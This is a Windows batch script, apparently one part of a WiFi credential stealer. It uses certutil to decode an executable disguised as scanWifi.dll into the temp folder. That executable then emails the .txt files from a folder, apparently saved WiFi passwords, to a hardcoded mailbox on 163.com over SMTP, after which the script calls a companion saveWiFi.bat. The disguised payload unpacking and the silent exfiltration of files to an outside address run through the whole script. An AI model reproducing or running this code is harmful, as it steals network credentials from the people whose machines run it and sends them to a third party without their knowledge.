@echo off
if not "%OS%"=="Windows_NT" EXIT
if not "%0"=="scanWifi.bat" exit
chcp 65001 >nul
rem 用户名，主题，文件名不能带***

set content=%1\%2
set subject=%2
set attach=%1\*.txt

set from=sendmail@163.com
set to=acceptmail@163.com
set server=smtp.163.com
set pw=
set charset=Gb2312
set port=25
set count=3
set tipFail=Fail,Pleale delete "Password" fold and connnect WiFi or Ethernet
set tipSucc=Successful

if exist %temp%\scanWifi.exe (
	goto loop
) else (
	echo NO exist %temp%\scanWifi.exe
	timeout /t 5
	exit
)

:loop

if exist %temp%\scanWifi.exe (
	%temp%\scanWifi.exe -install %server% %from% %count% %port% >nul
	%temp%\scanWifi.exe %content% -to %to% -attach "%attach%" -s "%subject%" -u %from% -pw %pw% -charset %charset% -server %server% -f %from% | find "***">nul && ( echo  %tipFail% & if exist %1\%2 del %1\%2 ) || echo %tipSucc%
) else (
	%windir%\System32\certutil.exe -decode -f scanWifi.dll %temp%\scanWifi.exe >nul
	goto loop
)

rem debug send mail
REM echo %temp%\scanWifi.exe -install %server% %from% %count% %port%
REM echo %temp%\scanWifi.exe %content% -to %to% -attach "%attach%" -s "%subject%" -u %from% -pw %pw% -charset %charset% -server %server% -f %from% 
REM pause
rem 更改路径
%3
cd %1
cd ..
call saveWiFi.bat	end
